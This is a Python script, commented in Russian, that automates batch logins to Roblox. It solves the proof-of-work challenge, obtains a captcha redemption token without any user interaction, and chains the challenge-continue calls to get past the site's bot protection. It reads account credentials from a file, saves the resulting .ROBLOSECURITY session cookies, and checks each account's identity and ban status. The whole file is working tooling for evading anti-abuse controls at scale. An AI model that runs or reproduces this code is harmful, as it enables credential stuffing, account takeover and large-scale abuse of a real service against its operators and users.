"""Пакетный вход без капчи: PoW + токен captcha + continue.

Полный HTTP-путь, найденный 2026-10-29:

  1. вход с подписью SAI            -> 403 proofofwork
  2. GET  pow-puzzle, решение        -> answerCorrect + redemptionToken
  3. POST challenge/v1/continue      -> 200, следующая ступень captchav2
  4. POST v2/captcha {challenge_id}  -> 200 {"redemption_token": ...} без интерактива
  5. POST challenge/v1/continue с токеном captcha -> 200, цепочка закрыта
  6. повтор входа с rblx-challenge-* -> 200 + .ROBLOSECURITY

    python -u -m probes.no_captcha_batch --limit 6
"""

from __future__ import annotations

import argparse
import base64
import json
import time
from collections import Counter
from pathlib import Path

import httpx

import probes.pow_full as powmod

UA = powmod.UA
H = powmod.H
LOGIN = powmod.LOGIN
PUZZLE = powmod.PUZZLE
CONTINUE = "https://apis.roblox.com/challenge/v1/continue"
CAPTCHA = "https://apis.roblox.com/v2/captcha?urlLocale=en_us"
VERIFY = "https://users.roblox.com/v1/users/authenticated"


def b64(obj) -> str:
    if isinstance(obj, str):
        return base64.b64encode(obj.encode()).decode()
    return base64.b64encode(json.dumps(obj).encode()).decode()


def solve_pow(client: httpx.Client, headers: dict, session_id: str) -> dict:
    puzzle = client.get(PUZZLE, headers={"User-Agent": UA},
                        params={"sessionID": session_id}).json()
    art = puzzle["artifacts"]
    if isinstance(art, str):
        art = json.loads(art)
    started = time.perf_counter()
    solution = str(pow(int(art["A"]), 1 << int(art["T"]), int(art["N"])))
    seconds = time.perf_counter() - started
    verdict = client.post(PUZZLE, headers=headers,
                          json={"sessionID": session_id, "solution": solution}).json()
    return {"token": verdict.get("redemptionToken", ""),
            "correct": verdict.get("answerCorrect"), "seconds": round(seconds, 2),
            "difficulty": int(art.get("T") or 0)}


def login_without_captcha(client: httpx.Client, account: dict) -> dict:
    """Полный проход. Возвращает словарь с результатом и таймингами."""
    started = time.perf_counter()
    client.get("https://www.roblox.com/login", headers={**H, "Accept": "text/html"})
    r0 = client.post(LOGIN, headers=H,
                     json={"ctype": "Username", "cvalue": "p", "password": "x"})
    headers = dict(H)
    if r0.headers.get("x-csrf-token"):
        headers["X-CSRF-TOKEN"] = r0.headers["x-csrf-token"]

    nonce = client.get("https://apis.roblox.com/hba-service/v1/getServerNonce",
                       headers={"User-Agent": UA}).json()
    body = {"ctype": "Username", "cvalue": account["login"],
            "password": account["password"],
            "secureAuthenticationIntent": powmod.make_sai(str(nonce))}
    r1 = client.post(LOGIN, headers=headers, json=body)
    if r1.headers.get("x-csrf-token"):
        headers["X-CSRF-TOKEN"] = r1.headers["x-csrf-token"]
    meta = powmod.b64json(r1.headers.get("rblx-challenge-metadata", ""))
    if not meta.get("sessionId"):
        jars = {c.name: c.value for c in client.cookies.jar}
        row = {"login": account["login"], "status": r1.status_code,
               "session": ".ROBLOSECURITY" in jars, "path": "без проверки",
               "elapsed": round(time.perf_counter() - started, 2)}
        if row["session"]:
            check = client.get(VERIFY, headers={"User-Agent": UA, "Accept": "application/json"})
            row["identity"] = check.json().get("name") if check.status_code == 200 else None
            (Path("var") / f"session-{account['login']}.json").write_text(
                json.dumps(jars, ensure_ascii=False, indent=2), encoding="utf-8")
        else:
            row["body"] = r1.text[:100]
        return row

    sid = meta["sessionId"]
    generic = (meta.get("sharedParameters") or {}).get("genericChallengeId")
    pow_result = solve_pow(client, headers, sid)
    if not pow_result["token"]:
        return {"login": account["login"], "outcome": "нет PoW-токена",
                "pow": pow_result}

    cont = client.post(CONTINUE, headers=headers,
                       json={"challengeId": generic, "challengeType": "proofofwork",
                             "challengeMetadata": json.dumps(
                                 {**meta, "redemptionToken": pow_result["token"]})})
    if cont.status_code != 200:
        return {"login": account["login"], "outcome": f"continue {cont.status_code}",
                "pow": pow_result}
    stage = cont.json()
    stage_id = stage.get("challengeId")
    stage_type = stage.get("challengeType") or "captchav2"

    cap = client.post(CAPTCHA, headers=headers, json={"challenge_id": stage_id})
    redeem = ""
    try:
        redeem = cap.json().get("redemption_token", "")
    except Exception:
        pass
    if not redeem:
        return {"login": account["login"], "outcome": f"captcha {cap.status_code}",
                "pow": pow_result, "stage": stage_type}

    cont2 = client.post(CONTINUE, headers=headers,
                        json={"challengeId": stage_id, "challengeType": stage_type,
                              "challengeMetadata": json.dumps({"redemptionToken": redeem})})
    if cont2.status_code != 200:
        return {"login": account["login"], "outcome": f"continue2 {cont2.status_code}",
                "pow": pow_result}

    final = {**headers, "rblx-challenge-id": str(stage_id),
             "rblx-challenge-type": stage_type,
             "rblx-challenge-metadata": b64({"redemptionToken": redeem})}
    resp = client.post(LOGIN, headers=final, json=body)
    jars = {c.name: c.value for c in client.cookies.jar}
    elapsed = round(time.perf_counter() - started, 2)
    result = {"login": account["login"], "status": resp.status_code,
              "pow_seconds": pow_result["seconds"], "difficulty": pow_result["difficulty"],
              "elapsed": elapsed, "session": ".ROBLOSECURITY" in jars}
    if result["session"]:
        check = client.get(VERIFY, headers={"User-Agent": UA, "Accept": "application/json"})
        result["identity"] = check.json().get("name") if check.status_code == 200 else None
        result["banned"] = bool(resp.json().get("isBanned")) if resp.text.startswith("{") else None
        (Path("var") / f"session-{account['login']}.json").write_text(
            json.dumps(jars, ensure_ascii=False, indent=2), encoding="utf-8")
    else:
        result["body"] = resp.text[:120]
    return result


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--limit", type=int, default=6)
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--out", default="var/no-captcha-batch.json")
    args = ap.parse_args()

    accounts = json.loads(Path("var/accounts.json").read_text(encoding="utf-8"))
    chosen = accounts[args.offset: args.offset + args.limit]
    rows = []
    for index, account in enumerate(chosen, 1):
        try:
            with httpx.Client(timeout=120, follow_redirects=False) as client:
                row = login_without_captcha(client, account)
        except Exception as exc:
            row = {"login": account["login"], "outcome": f"{type(exc).__name__}: {exc}"[:90]}
        rows.append(row)
        state = ("СЕССИЯ" if row.get("session")
                 else row.get("outcome") or str(row.get("status")))
        print(f"  {index:>2}/{len(chosen)} {account['login']:<24} -> {state} "
              f"| PoW {row.get('pow_seconds', '-')} с, всего {row.get('elapsed', '-')} с",
              flush=True)
        time.sleep(2)

    summary = Counter("сессия" if r.get("session") else "нет" for r in rows)
    print(f"\nитог: {dict(summary)}", flush=True)
    Path(args.out).write_text(json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
